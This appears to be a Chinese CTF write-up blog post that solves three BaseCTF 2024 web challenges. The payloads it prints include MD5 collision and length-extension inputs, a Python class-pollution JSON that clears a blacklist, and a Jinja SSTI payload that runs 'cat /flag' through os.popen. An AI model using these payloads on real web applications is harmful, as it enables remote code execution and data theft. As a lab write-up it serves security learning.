---
title: BaseCTF2024新生赛（复现部分
date: 2025-09-02 21:31:07
updated: 2025-09-02 21:31:07
author: Xebdria
categories:
  - wp
  - 比赛
permalink: http://xendria.icu/?p=451
---
<!-- wp:heading -->
<h2 class="wp-block-heading">所以你说你懂 MD5?</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code><?php
session_start();
highlight_file(__FILE__);
// 所以你说你懂 MD5 了?

$apple = $_POST['apple'];
$banana = $_POST['banana'];
if (!($apple !== $banana && md5($apple) === md5($banana))) {
    die('加强难度就不会了?');
}

// 什么? 你绕过去了?
// 加大剂量!
// 我要让他成为 string
$apple = (string)$_POST['appple'];
$banana = (string)$_POST['bananana'];
if (!((string)$apple !== (string)$banana && md5((string)$apple) == md5((string)$banana))) {
    die('难吗?不难!');
}

// 你还是绕过去了?
// 哦哦哦, 我少了一个等于号
$apple = (string)$_POST['apppple'];
$banana = (string)$_POST['banananana'];
if (!((string)$apple !== (string)$banana && md5((string)$apple) === md5((string)$banana))) {
    die('嘻嘻, 不会了? 没看直播回放?');
}

// 你以为这就结束了
if (!isset($_SESSION['random'])) {
    $_SESSION['random'] = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16));
}

// 你想看到 random 的值吗?
// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧
$random = $_SESSION['random'];
echo md5($random);
echo '<br />';

$name = $_POST['name'] ?? 'user';

// check if name ends with 'admin'
if (substr($name, -5) !== 'admin') {
    die('不是管理员也来凑热闹?');
}

$md5 = $_POST['md5'];
if (md5($random . $name) !== $md5) {
    die('伪造? NO NO NO!');
}

// 认输了, 看样子你真的很懂 MD5
// 那 flag 就给你吧
echo "看样子你真的很懂 MD5";
echo file_get_contents('/flag'); 6f0f100676701a2978accb15ec22f218
不是管理员也来凑热闹?</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>第一层的强比较可以用数组绕过apple[]=1&banana[]=2<br>然后第二层的弱比较可以用两个经过md5后开头为0e的来绕过<br>第三层的强比较我们可以使用 fastcoll 工具，碰撞出一个值来绕过<br>第四层运用到了md5的长度扩展攻击，这玩意感觉挺复杂的，但是网上能找到工具<br><a href="https://github.com/luoingly/attack-scripts/blob/main/logic/md5-extension-attack.py">https://github.com/luoingly/attack-scripts/blob/main/logic/md5-extension-attack.py</a><br>就是说通过一个已知哈希值 Hash 和消息长度 len(Msg) 的哈希值时，我们能利用其复现出大致的加密过程，然后我们利用这个的过程重新生成一个附加了新数据的md5值<br>哈希值在我们绕过第三层的时候会给我们，消息长度和我们需要的附加值的话我们看到这里</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>if (!isset($_SESSION['random'])) {
    $_SESSION['random'] = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16));
}//这里就能看出长度了16字节*3=48个字节，48个字节 * 2 十六进制字符/字节 = 96个字符

// 你想看到 random 的值吗?
// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧
$random = $_SESSION['random'];
echo md5($random);
echo '<br />';

$name = $_POST['name'] ?? 'user';

// check if name ends with 'admin'
if (substr($name, -5) !== 'admin') {
    die('不是管理员也来凑热闹?');
}

$md5 = $_POST['md5'];
if (md5($random . $name) !== $md5) {
    die('伪造? NO NO NO!');
}

// 认输了, 看样子你真的很懂 MD5
// 那 flag 就给你吧
echo "看样子你真的很懂 MD5";
echo file_get_contents('/flag');</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>就是96个字符，然后添加个admin</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":462,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/06/cc922cac-6c45-41b5-8f41-9ae04d09fd19-1024x188.png" alt="" class="wp-image-462"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":463,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/06/c575db54-19c6-498c-8cd7-184887bc8c33-1024x511.png" alt="" class="wp-image-463"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>记得把cookie改为绕过第三层时的PHPSESSID（栽这半天了</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>payload：
apple[]=1&banana[]=2&appple=byGcY&bananana=QNKCDZO&apppple=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&banananana=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2&name=%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%03%00%00%00%00%00%00admin&md5=生成的值</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2 class="wp-block-heading">玩原神玩的</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code><?php
highlight_file(__FILE__);
error_reporting(0);

include 'flag.php';
if (sizeof($_POST['len']) == sizeof($array)) {
  ys_open($_GET['tip']);
} else {
  die("错了！就你还想玩原神？❌❌❌");
}

function ys_open($tip) {
  if ($tip != "我要玩原神") {
    die("我不管，我要玩原神！😭😭😭");
  }
  dumpFlag();
}

function dumpFlag() {
  if (!isset($_POST['m']) || sizeof($_POST['m']) != 2) {
    die("可恶的QQ人！😡😡😡");
  }
  $a = $_POST['m'][0];
  $b = $_POST['m'][1];
  if(empty($a) || empty($b) || $a != "100%" || $b != "love100%" . md5($a)) {
    die("某站崩了？肯定是某忽悠干的！😡😡😡");
  }
  include 'flag.php';
  $flag[] = array();
  for ($ii = 0;$ii < sizeof($array);$ii++) {
    $flag[$ii] = md5(ord($array[$ii]) ^ $ii);
  }
  
  echo json_encode($flag);
} 错了！就你还想玩原神？❌❌❌</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>给了一大串的源码，来瞅瞅</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>include 'flag.php';
if (sizeof($_POST['len']) == sizeof($array)) {
  ys_open($_GET['tip']);
} else {
  die("错了！就你还想玩原神？❌❌❌");
}//这是是要检查$_POST['len']数组的长度是否与$array数组的长度相同，然后就能调用这个函数继续走下去</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>然后就是在ys_open里要满足$tip == "我要玩原神"</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>再看到</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>function dumpFlag() {
  if (!isset($_POST['m']) || sizeof($_POST['m']) != 2) {
    die("可恶的QQ人！😡😡😡");
  }
  $a = $_POST['m'][0];
  $b = $_POST['m'][1];
  if(empty($a) || empty($b) || $a != "100%" || $b != "love100%" . md5($a)) {
    die("某站崩了？肯定是某忽悠干的！😡😡😡");
  }//主要就是这里$a == "100%"并且$b == "love100%" . md5($a)
  
}</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>我们构造</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":456,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="http://xendria.icu/wp-content/uploads/2025/06/5545fa44c2333d3574baa0888dab8d5b-1024x624.png" alt="" class="wp-image-456"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>然后问题就是这个了</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>include 'flag.php';
  $flag[] = array();
  for ($ii = 0;$ii < sizeof($array);$ii++) {
    $flag[$ii] = md5(ord($array[$ii]) ^ $ii);
  }
  echo json_encode($flag);</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>需要我们通过逆向给的数据还原出flag，我们直接模仿他的操作然后匹配flag字符就好了</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>贴个脚本
<?php

$md5 = ["3295c76acbf4caaed33c36b1b5fc2cb1","26657d5ff9020d2abefe558796b99584","73278a4a86960eeb576a8fd4c9ec6997","ec8956637a99787bd197eacd77acce5e","e2c420d928d4bf8ce0ff2ec19b371514","43ec517d68b6edd3015b3edc9a11367b","ea5d2f1c4608232e07d3aa3d998e5135","c8ffe9a587b126f152ed3d89a146b445","a97da629b098b75c294dffdc3e463904","03afdbd66e7929b125f8597834fa83a4","a3c65c2974270fd093ee8a9bf8ae7d0b","66f041e16a60928b05a7e228a89c3799","f0935e4cd5920aa6c7c996a5ee53a70f","698d51a19d8a121ce581499d7b701668","9f61408e3afb633e50cdf1b20de6f466","9f61408e3afb633e50cdf1b20de6f466","7f39f8317fbdb1988ef4c628eba02591","a5771bce93e200c36f7cd9dfd0e5deaa","19ca14e7ea6328a42e0eb13d585e4c22","d67d8ab4f4c10bf22aa353e27879133c","a5771bce93e200c36f7cd9dfd0e5deaa","9f61408e3afb633e50cdf1b20de6f466","e369853df766fa44e1ed0ff613f563bd","5ef059938ba799aaa845e1c2e8a762bd","4c56ff4ce4aaf9573aa5dff913df997a","6c8349cc7260ae62e3b1396831a8398f","b53b3a3d6ab90ce0268229151c9bde11","a0a080f42e6f13b3a2df133f073095dd","67c6a1e7ce56d3d6fa748ab6d9af3fd7","202cb962ac59075b964b07152d234b70","a1d0c6e83f027327d8461063f4ac58a6","c0c7c76d30bd3dcaefc96f40275bdc0a","fc490ca45c00b1249bbe3554a4fdf6fb","735b90b4568125ed6c3f678819b6e058","98f13708210194c475687be6106a3b84","b6d767d2f8ed5d21a44b0e5886680cb9","c74d97b01eae257e44aa9d5bade97baf","735b90b4568125ed6c3f678819b6e058","c16a5320fa475530d9583c34fd356ef5","a3f390d88e4c41f2747bfa2f1b5f87db","c16a5320fa475530d9583c34fd356ef5","1ff1de774005f8da13f42943881c655f","6ea9ab1baa0efb9e19094440c317e21b","4e732ced3463d06de0ca9a15b6153677","43ec517d68b6edd3015b3edc9a11367b"];

$flag = '';

for ($i = 0; $i < count($md5); $i++) {
    $found = false;
    for ($j = 0; $j < 256; $j++) {
        if (md5(ord(chr($j)) ^ $i) === $md5[$i]) {
            $flag .= chr($j);
            $found = true;
            break;
        }
    }
    if (!$found) {
        $flag .= '?';
    }
}

echo "Flag: $flag\n";
?></code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Jinja Mark</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>有两个路由一个/flag ，一个index。我们先看看<br><img class="wp-image-452" style="width: 900px;" src="http://xendria.icu/wp-content/uploads/2025/06/a1c3787b-6cc0-4c5d-abf0-3a283f45af79.png" alt=""><img class="wp-image-453" style="width: 900px;" src="http://xendria.icu/wp-content/uploads/2025/06/a63cba62-9367-45c1-9550-38c0eb74b065.png" alt=""></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":454,"width":"840px","height":"auto","sizeSlug":"full","linkDestination":"none"} -->
<figure class="wp-block-image size-full is-resized"><img src="http://xendria.icu/wp-content/uploads/2025/06/b9ffbf01-70e2-4c8d-b4e4-895108e58bb0.png" alt="" class="wp-image-454" style="width:840px;height:auto"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>我们把lucky_number爆破出来获得部分源码</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>你不会以为这里真的有flag吧？

想要flag的话先猜猜我的幸运数字

用POST方式把 lucky_number 告诉我吧，只有四位数哦

BLACKLIST_IN_index = ['{','}']
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
@app.route('/magic',methods=['POST', 'GET'])
def pollute():
    if request.method == 'POST':
        if request.is_json:
            merge(json.loads(request.data), instance)
            return "这个魔术还行吧"
        else:
            return "我要json的魔术"
    return "记得用POST方法把魔术交上来"</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>emm，我们看到了过滤了{}，我们可以利用原型污染把这个全局变量BLACKLIST_IN_index = ['{','}']改了</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>{
    "__init__" : {
        "__globals__" : {
            "BLACKLIST_IN_index" : []
        }
    }
}


</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":455,"width":"828px","height":"auto","sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large is-resized"><img src="http://xendria.icu/wp-content/uploads/2025/06/7a714105-739c-4a5f-8d5d-ae8ad014d318-1024x489.png" alt="" class="wp-image-455" style="width:828px;height:auto"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>然后就能正常ssti了<br>{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}</p>
<!-- /wp:paragraph -->